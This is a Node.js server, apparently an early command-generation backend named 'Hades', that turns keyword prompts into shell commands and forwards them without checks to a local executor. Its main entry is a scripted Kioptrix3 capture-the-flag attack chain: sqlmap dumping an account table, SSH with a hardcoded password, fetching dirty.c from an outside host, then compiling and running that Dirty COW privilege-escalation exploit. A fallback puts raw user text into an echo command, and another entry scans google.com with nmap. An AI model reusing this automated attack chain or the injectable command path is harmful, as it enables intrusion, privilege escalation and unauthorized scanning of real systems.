const express = require("express");
const axios = require("axios");

const app = express();
const PORT = 8000;

app.use(express.json());

const commandMap = [
  {
    match: (text) =>
      text.includes("kioptrix3") || text.includes("ctf hack steps"),
    commands: [
      "arp-scan -localnet",
      "# Analyze output manually and get IP (e.g., 192.168.1.101)",
      "sqlmap -u http://192.168.1.101/gallery.php?id=1 --dbs",
      "sqlmap -u http://192.168.1.101/gallery.php?id=1 -D gallery --tables",
      "sqlmap -u http://192.168.1.101/gallery.php?id=1 -D gallery -T devaccount --dump",
      "# Decode the password manually if it’s encoded (Step 7)",
      "ssh -oHostkeyAlgorithms+=ssh-rsa loneferret@kioptrix3.com",
      "starwars",
      "uname -a",
      "wget http://192.168.110.169/dirty.c",
      "gcc -pthread dirty.c -o dirty -lcrypt",
      "./dirty your-password",
      "su firefart",
      "your-password",
      "cat congrats.txt",
    ],
  },
  {
    match: (text) => text.includes("list") && text.includes("file"),
    commands: ["ls -la", "pwd"],
  },
  {
    match: (text) => text.includes("system") || text.includes("info"),
    commands: ["uname -a", "whoami", "hostname"],
  },
  {
    match: (text) => text.includes("network") || text.includes("scan"),
    commands: ["nmap -A google.com"],
  },
  {
    match: (text) => text.includes("process") || text.includes("running"),
    commands: ["ps aux"],
  },
  {
    match: (text) => text.includes("disk") || text.includes("space"),
    commands: ["df -h"],
  },
];

app.post("/api/v1/generateCommand", async (req, res) => {
  try {
    const { prompt } = req.body;
    console.log(`[+] Received prompt: "${prompt}"`);

    if (!prompt) {
      return res.status(400).json({
        error: "No prompt provided",
        commands: [],
      });
    }

    let commands = [];
    const lowerPrompt = prompt.toLowerCase();

    const matched = commandMap.find((entry) => entry.match(lowerPrompt));
    commands = matched
      ? matched.commands
      : [`echo "Processing: ${prompt}"`, "pwd"];

    console.log(`[+] Generated commands: ${JSON.stringify(commands)}`);

    res.json({ commands });

    try {
      const response = await axios.post("http://localhost:3000/execute", {
        commands: commands,
      });

      console.log("[+] Response from Go server:");
      console.dir(response.data, { depth: null });
    } catch (forwardErr) {
      console.error("[!] Failed to forward commands:", forwardErr.toString());
    }
  } catch (error) {
    console.error("[!] Error processing prompt:", error);
    res.status(500).json({
      error: "Failed to generate commands",
      commands: [],
    });
  }
});

app.listen(PORT, () => {
  console.log(`Hades HTTP server listening on http://localhost:${PORT}`);
});
